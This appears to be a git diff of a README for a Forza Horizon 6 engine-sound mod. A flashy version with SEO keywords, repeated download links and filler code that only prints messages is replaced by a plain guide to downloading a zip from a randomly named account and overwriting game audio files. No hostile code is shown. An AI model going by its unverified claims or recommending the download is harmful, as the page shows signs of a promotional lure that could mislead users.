@@ -1,318 +1,78 @@
-<p align="center">
-  <img src="./Screenshots/banner.png" width="100%">
-</p>
-<div align="center">
+# 🏎️ fh6-engine-sound-pack - Cinematic engine audio for Forza Horizon 6
 
-# FH6 REV ENGINE AUDIO PROJECT
+[![Download Now](https://img.shields.io/badge/Download_Engine_Pack-Blue?style=for-the-badge)](https://github.com/Lynnellefineleafed325/fh6-engine-sound-pack)
 
-### CINEMATIC ENGINE EXPERIENCE FOR FORZA HORIZON 6
+This project provides an audio overhaul for Forza Horizon 6. It replaces standard game audio files with high-fidelity engine recordings. You get realistic turbo spool sounds, deeper exhaust notes, and precise mechanical acoustics while you drive. The pack aims to make every vehicle sound distinct and powerful.
 
-<br>
+## 🛠️ System Requirements
 
-<img src="https://img.shields.io/github/downloads/LavenderBeetleRoof/fh6-engine-sound-pack/total?style=for-the-badge&color=orange">
-<img src="https://img.shields.io/github/v/release/LavenderBeetleRoof/fh6-engine-sound-pack?style=for-the-badge&color=red">
-<img src="https://img.shields.io/github/stars/LavenderBeetleRoof/fh6-engine-sound-pack?style=for-the-badge&color=yellow">
-<img src="https://img.shields.io/github/issues/LavenderBeetleRoof/fh6-engine-sound-pack?style=for-the-badge&color=blue">
-<img src="https://img.shields.io/github/license/LavenderBeetleRoof/fh6-engine-sound-pack?style=for-the-badge&color=green">
+Your computer needs to meet these basic standards to run the sound mod effectively:
 
-<br><br>
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Storage: At least 2 gigabytes of free disk space.
+*   Software: A functioning installation of Forza Horizon 6.
+*   Peripherals: Headphones or speakers for optimal sound quality.
 
-# ► [DOWNLOAD LATEST RELEASE](../../releases/latest)
+## 📥 How to Install
 
-### ADVANCED ENGINE SOUND OVERHAUL
+The installation process moves your game files to a new state. Please follow each step to ensure the mod works correctly.
 
-</div>
+1. Visit the [official repository page](https://github.com/Lynnellefineleafed325/fh6-engine-sound-pack) to access the files.
+2. Look for the "Releases" section on the right side of the screen.
+3. Click the latest version of the sound pack.
+4. Download the file ending in .zip to your computer.
+5. Create a new folder on your desktop and move the downloaded zip file there.
+6. Right-click the zip file and select "Extract All."
+7. Open the newly created folder containing the extracted files.
 
----
+## ⚙️ Applying the Mod
 
-# SYSTEM STATUS
+After you extract the archive, you must copy the files into the game folder. 
 
-```diff
-+ Engine Acoustics Loaded
-+ Turbo Layers Optimized
-+ Exhaust Profiles Active
-+ RPM Balancing Enabled
-+ Performance Stable
-```
+1. Locate your Forza Horizon 6 installation folder. This is usually found in your Steam library or the WindowsApps directory.
+2. Open the folder named "Media" inside your game directory.
+3. Find the subfolder labeled "Audio."
+4. Drag and drop the files from your extracted mod folder into this "Audio" subfolder.
+5. Windows might ask if you want to replace existing files. Select "Yes" to confirm the replacement. 
 
----
+Your audio files are now updated. The next time you start the game, the new sounds will load automatically.
 
-# QUICK INSTALL
+## 🎧 Audio Features
 
-```bash
-1. Download latest release
-2. Extract archive
-3. Move files into FH6 directory
-4. Launch the game
-```
+The pack improves several areas of the game audio.
 
----
+*   Turbocharger: The system increases the audible range of your turbo. You will hear crisp spooling sounds and precise blow-off valve releases.
+*   Exhaust Tones: We adjusted the frequency range of the exhaust. This results in heavy bass at low RPM and sharp, clear notes as you reach the redline.
+*   Mechanical Acoustics: We added interior engine resonance. You feel the intensity of the motor inside the cockpit.
+*   Surface Feedback: Tire noise matches the road surface. You hear distinct changes when driving on tarmac, dirt, or gravel.
 
-# AUDIO MODULES
+## 🛡️ Troubleshooting
 
-```yaml
-Engine:
-  - Deep resonance
-  - Smooth RPM transition
-  - Aggressive acceleration tone
-  - Improved rev feedback
+Most issues arise from file placement. If you do not hear changes in-game, please review these common points:
 
-Turbo:
-  - Enhanced spool
-  - Sharper pressure release
-  - Blow-off optimization
+*   Check the file path. Ensure you placed the mod inside the correct "Audio" folder within the directory of the game.
+*   Verify your game files if the audio breaks. Steam and the Xbox app have a "Verify integrity of game files" option. This will restore the original sounds if needed.
+*   Disable other audio mods. Running multiple sound mods at the same time often causes conflicts and crashes.
+*   Restart your system. Sometimes background processes cache old audio files. A reboot clears this memory.
 
-Exhaust:
-  - Cleaner texture
-  - Better crackles
-  - Sharper downshift pops
-```
+## 💡 Customizing Your Experience
 
----
+You can fine-tune the impact of these sounds within the game menu. Open the settings menu in Forza Horizon 6 and navigate to the Audio tab.
 
-# PROJECT OVERVIEW
+*   Engine Volume: Use this slider to balance the engine noise against background music.
+*   Dynamic Range: Set this to "Full" to hear the highest quality version of the modded files.
+*   Speaker Configuration: Ensure this matches your hardware setup, such as Stereo, 5.1, or 7.1 surround sound.
 
-FH6 REV ENGINE AUDIO PROJECT rebuilds the driving sound atmosphere inside Forza Horizon 6 using cleaner balancing, refined engine layering and improved exhaust acoustics.
+The mod does not require additional software to run. It functions as a direct file replacement. We designed the files to fit the existing sound engine of the game. You do not need to edit any configuration scripts or use external mod loaders. 
 
-The project focuses on cinematic immersion rather than simply increasing audio volume.
+## 🌐 Community and Support
 
----
+The modification process relies on standard game behavior. We designed the package to be stable and easy to remove. If you want to go back to the original sound, simply delete the files you pasted into the "Audio" folder and verify your game files through your game launcher. The launcher will detect the missing original files and download them for you automatically.
 
-# PERFORMANCE
+We appreciate feedback regarding the audio balance of specific vehicles. If a car feels too loud or quiet, please report it through the GitHub issues page. You can reach the discussion board by clicking the "Issues" tab at the top of the repository page. 
 
-```ini
-[Audio]
-Latency=Low
-Streaming=Optimized
-CPU_Usage=Minimal
-DynamicRange=Balanced
-Stability=High
-```
+Check back periodically for updates. We will release new versions as Forza Horizon 6 receives updates to ensure compatibility with the latest game physics and engine models. Each update will contain improved samples and refined mixing to keep the experience current.
 
----
+Keep your drivers updated to the latest version to maintain support for modern sound drivers. Windows often provides these updates automatically. If you notice stuttering audio or dropped sounds, ensure you have the latest audio driver from your motherboard or sound card manufacturer website.
 
-# LIVE ENGINE PROFILE
-
-```cpp
-#include <iostream>
-
-class FH6EngineProfile
-{
-public:
-    float EngineDepth = 1.15f;
-    float TurboPressure = 1.20f;
-    float ExhaustIntensity = 1.10f;
-    float RPMTransition = 0.94f;
-
-    void PrintProfile()
-    {
-        std::cout << "FH6 REV ENGINE PROFILE ACTIVE" << std::endl;
-    }
-};
-
-int main()
-{
-    FH6EngineProfile Profile;
-    Profile.PrintProfile();
-
-    return 0;
-}
-```
-
----
-
-# AUDIO MANAGER
-
-```python
-class AudioManager:
-
-    def __init__(self):
-        self.engine_depth = 1.15
-        self.turbo_profile = "Enhanced"
-        self.exhaust_mode = "Sport"
-
-    def initialize(self):
-        print("FH6 Audio System Initialized")
-
-    def load_engine_profile(self):
-        print("Loading Engine Layers")
-
-    def load_turbo_system(self):
-        print("Loading Turbo Acoustics")
-
-    def optimize_audio(self):
-        print("Optimizing Audio Streaming")
-
-
-if __name__ == "__main__":
-    manager = AudioManager()
-
-    manager.initialize()
-    manager.load_engine_profile()
-    manager.load_turbo_system()
-    manager.optimize_audio()
-```
-
----
-
-# CONFIGURATION
-
-```ini
-[Engine]
-Depth=1.15
-Aggression=1.05
-RPMTransition=0.94
-
-[Turbo]
-Spool=1.20
-PressureRelease=1.10
-
-[Exhaust]
-Crackle=1.05
-Backfire=1.12
-```
-
----
-
-# COMPATIBILITY
-
-| System | Support |
-|---|---|
-| Latest FH6 Update | ✅ |
-| Online Sessions | ✅ |
-| Custom Cars | ✅ |
-| Visual Mods | ✅ |
-| High-End Audio Setup | ✅ |
-
----
-
-# REPOSITORY STRUCTURE
-
-```text
-FH6-REV-ENGINE-AUDIO/
-│
-├── README.md
-├── CHANGELOG.md
-├── LICENSE
-├── INSTALLATION.md
-├── FAQ.md
-│
-├── Audio/
-│   ├── Engines/
-│   ├── Turbo/
-│   ├── Exhaust/
-│   ├── Backfire/
-│   └── Layers/
-│
-├── Config/
-│   ├── audio.ini
-│   ├── balancing.cfg
-│   └── presets.cfg
-│
-├── Scripts/
-│   ├── audio_manager.py
-│   └── engine_profile.cpp
-│
-├── Presets/
-│   ├── Street/
-│   ├── Sport/
-│   └── Racing/
-│
-└── Screenshots/
-```
-
----
-
-# GITHUB ACTIONS
-
-```yaml
-name: Build Release
-
-on:
-  push:
-    tags:
-      - 'v*'
-
-jobs:
-  release:
-    runs-on: ubuntu-latest
-
-    steps:
-      - uses: actions/checkout@v4
-
-      - name: Create Release Archive
-        run: zip -r fh6-audio-pack.zip .
-
-      - name: Upload Build
-        uses: softprops/action-gh-release@v2
-        with:
-          files: fh6-audio-pack.zip
-```
-
----
-
-# DOWNLOAD
-
-<div align="center">
-
-# ► [DOWNLOAD NOW](../../releases/latest)
-
-</div>
-
----
-
-# ROADMAP
-
-```md
-- Expanded engine presets
-- Improved turbo transitions
-- Additional exhaust profiles
-- New balancing system
-- More vehicle support
-```
-
----
-
-# RELEASE NOTES
-
-```diff
-+ Initial public release
-+ Engine overhaul
-+ Turbo improvements
-+ Exhaust balancing
-+ RPM transition rebuild
-```
-
----
-
-# SEO KEYWORDS
-
-```txt
-forza horizon 6 audio mod
-fh6 engine sound
-fh6 turbo audio
-forza horizon overhaul
-fh6 immersive driving
-fh6 exhaust sound
-fh6 cinematic audio
-```
-
----
-
-# DISCLAIMER
-
-This repository is created for customization and preservation purposes.
-
-Forza Horizon 6 and all related properties belong to their respective owners.
-
-This project is not affiliated with Playground Games or Microsoft.
-
----
-
-<div align="center">
-
-# FH6 REV ENGINE AUDIO PROJECT
-
-# ► [DOWNLOAD LATEST RELEASE](../../releases/latest)
-
-</div>
+Enjoy the ride. This mod turns every race into a cinematic event. Feel the gear shifts and the engine strain as you navigate the map. The road awaits you with a new soundscape.
